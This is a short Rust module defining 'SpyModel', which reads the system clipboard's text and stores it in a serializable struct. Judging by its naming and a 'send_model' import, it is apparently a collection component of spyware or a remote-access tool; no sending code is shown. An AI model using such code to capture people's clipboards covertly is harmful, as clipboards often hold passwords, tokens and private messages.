use serde::{Serialize, Deserialize};
use super::send_model_traits::{Serd, Producer};
use arboard::Clipboard;

#[derive(Debug, Serialize, Deserialize)]
pub struct SpyModel {
    clipboard: String
}

impl Producer for SpyModel {
    fn produce() -> Box<dyn Producer> {
        let mut clipboard = Clipboard::new().unwrap();
        let text = clipboard.get_text().unwrap();
        Box::new(Self { clipboard: text })
    }
}

impl Serd for SpyModel {}